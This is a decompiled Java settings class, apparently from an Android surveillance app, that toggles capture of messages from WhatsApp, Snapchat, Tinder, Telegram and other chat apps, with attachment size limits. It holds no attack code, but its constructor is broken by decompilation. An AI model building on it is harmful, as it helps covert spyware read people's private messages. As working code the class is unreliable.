package com.vvt.preference;

import java.io.Serializable;

public class PrefIMCaptureSettings
  extends a
  implements Serializable
{
  private static final long serialVersionUID = 4733203904638677698L;
  private long audioAttachmentSizeLimit;
  private long imageAttachmentSizeLimit;
  private boolean isBBMCaptureEnabled;
  private boolean isFacebookCaptureEnabled;
  private boolean isHangoutCaptureEnabled;
  private boolean isHikeCaptureEnabled;
  private boolean isInstagramCaptureEnabled;
  private boolean isKikMessengerCaptureEnabled;
  private boolean isLineCaptureEnabled;
  private boolean isQQCaptureEnabled;
  private boolean isSkypeCaptureEnabled;
  private boolean isSnapchatCaptureEnabled;
  private boolean isTelegramCaptureEnabled;
  private boolean isTinderCaptureEnabled;
  private boolean isViberCaptureEnabled;
  private boolean isWeChatCaptureEnabled;
  private boolean isWhatsAppCaptureEnabled;
  private boolean isYahooMessengerCaptureEnabled;
  private long nonMediaAttachmentSizeLimit;
  private long videoAttachmentSizeLimit;
  
  public PrefIMCaptureSettings()
  {
    this.isBBMCaptureEnabled = bool;
    this.isFacebookCaptureEnabled = bool;
    this.isHangoutCaptureEnabled = bool;
    this.isLineCaptureEnabled = bool;
    this.isSkypeCaptureEnabled = bool;
    this.isViberCaptureEnabled = bool;
    this.isWeChatCaptureEnabled = bool;
    this.isWhatsAppCaptureEnabled = bool;
    this.isYahooMessengerCaptureEnabled = bool;
    this.isKikMessengerCaptureEnabled = bool;
    this.isTelegramCaptureEnabled = bool;
    this.isTinderCaptureEnabled = bool;
    this.isSnapchatCaptureEnabled = bool;
    this.isQQCaptureEnabled = bool;
    this.isInstagramCaptureEnabled = bool;
    this.isHikeCaptureEnabled = bool;
    this.imageAttachmentSizeLimit = l;
    this.videoAttachmentSizeLimit = l;
    this.audioAttachmentSizeLimit = l;
    this.nonMediaAttachmentSizeLimit = l;
  }
  
  public long getAudioAttachmentSizeLimit()
  {
    return this.audioAttachmentSizeLimit;
  }
  
  public long getImageAttachmentSizeLimit()
  {
    return this.imageAttachmentSizeLimit;
  }
  
  public long getNonMediaAttachmentSizeLimit()
  {
    return this.nonMediaAttachmentSizeLimit;
  }
  
  public FxPreferenceType getType()
  {
    return FxPreferenceType.IM_CAPTURE_SETTINGS;
  }
  
  public long getVideoAttachmentSizeLimit()
  {
    return this.videoAttachmentSizeLimit;
  }
  
  public boolean isBBMCaptureEnabled()
  {
    return this.isBBMCaptureEnabled;
  }
  
  public boolean isFacebookCaptureEnabled()
  {
    return this.isFacebookCaptureEnabled;
  }
  
  public boolean isHangoutCaptureEnabled()
  {
    return this.isHangoutCaptureEnabled;
  }
  
  public boolean isHikeCaptureEnabled()
  {
    return this.isHikeCaptureEnabled;
  }
  
  public boolean isInstagramCaptureEnabled()
  {
    return this.isInstagramCaptureEnabled;
  }
  
  public boolean isKikMessengerCaptureEnabled()
  {
    return this.isKikMessengerCaptureEnabled;
  }
  
  public boolean isLineCaptureEnabled()
  {
    return this.isLineCaptureEnabled;
  }
  
  public boolean isQQCaptureEnabled()
  {
    return this.isQQCaptureEnabled;
  }
  
  public boolean isSkypeCaptureEnabled()
  {
    return this.isSkypeCaptureEnabled;
  }
  
  public boolean isSnapchatCaptureEnabled()
  {
    return this.isSnapchatCaptureEnabled;
  }
  
  public boolean isTelegramCaptureEnabled()
  {
    return this.isTelegramCaptureEnabled;
  }
  
  public boolean isTinderCaptureEnabled()
  {
    return this.isTinderCaptureEnabled;
  }
  
  public boolean isViberCaptureEnabled()
  {
    return this.isViberCaptureEnabled;
  }
  
  public boolean isWeChatCaptureEnabled()
  {
    return this.isWeChatCaptureEnabled;
  }
  
  public boolean isWhatsAppCaptureEnabled()
  {
    return this.isWhatsAppCaptureEnabled;
  }
  
  public boolean isYahooMessengerCaptureEnabled()
  {
    return this.isYahooMessengerCaptureEnabled;
  }
  
  public void setAudioAttachmentSizeLimit(long paramLong)
  {
    this.audioAttachmentSizeLimit = paramLong;
  }
  
  public void setBBMCaptureEnabled(boolean paramBoolean)
  {
    this.isBBMCaptureEnabled = paramBoolean;
  }
  
  public void setFacebookCaptureEnabled(boolean paramBoolean)
  {
    this.isFacebookCaptureEnabled = paramBoolean;
  }
  
  public void setHangoutCaptureEnabled(boolean paramBoolean)
  {
    this.isHangoutCaptureEnabled = paramBoolean;
  }
  
  public void setHikeCaptureEnabled(boolean paramBoolean)
  {
    this.isHikeCaptureEnabled = paramBoolean;
  }
  
  public void setImageAttachmentSizeLimit(long paramLong)
  {
    this.imageAttachmentSizeLimit = paramLong;
  }
  
  public void setInstagramCaptureEnabled(boolean paramBoolean)
  {
    this.isInstagramCaptureEnabled = paramBoolean;
  }
  
  public void setKikMessengerCaptureEnabled(boolean paramBoolean)
  {
    this.isKikMessengerCaptureEnabled = paramBoolean;
  }
  
  public void setLineCaptureEnabled(boolean paramBoolean)
  {
    this.isLineCaptureEnabled = paramBoolean;
  }
  
  public void setNonMediaAttachmentSizeLimit(long paramLong)
  {
    this.nonMediaAttachmentSizeLimit = paramLong;
  }
  
  public void setQQCaptureEnabled(boolean paramBoolean)
  {
    this.isQQCaptureEnabled = paramBoolean;
  }
  
  public void setSkypeCaptureEnabled(boolean paramBoolean)
  {
    this.isSkypeCaptureEnabled = paramBoolean;
  }
  
  public void setSnapchatCaptureEnabled(boolean paramBoolean)
  {
    this.isSnapchatCaptureEnabled = paramBoolean;
  }
  
  public void setTelegramCaptureEnabled(boolean paramBoolean)
  {
    this.isTelegramCaptureEnabled = paramBoolean;
  }
  
  public void setTinderCaptureEnabled(boolean paramBoolean)
  {
    this.isTinderCaptureEnabled = paramBoolean;
  }
  
  public void setViberCaptureEnabled(boolean paramBoolean)
  {
    this.isViberCaptureEnabled = paramBoolean;
  }
  
  public void setVideoAttachmentSizeLimit(long paramLong)
  {
    this.videoAttachmentSizeLimit = paramLong;
  }
  
  public void setWeChatCaptureEnabled(boolean paramBoolean)
  {
    this.isWeChatCaptureEnabled = paramBoolean;
  }
  
  public void setWhatsAppCaptureEnabled(boolean paramBoolean)
  {
    this.isWhatsAppCaptureEnabled = paramBoolean;
  }
  
  public void setYahooMessengerCaptureEnabled(boolean paramBoolean)
  {
    this.isYahooMessengerCaptureEnabled = paramBoolean;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/preference/PrefIMCaptureSettings.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */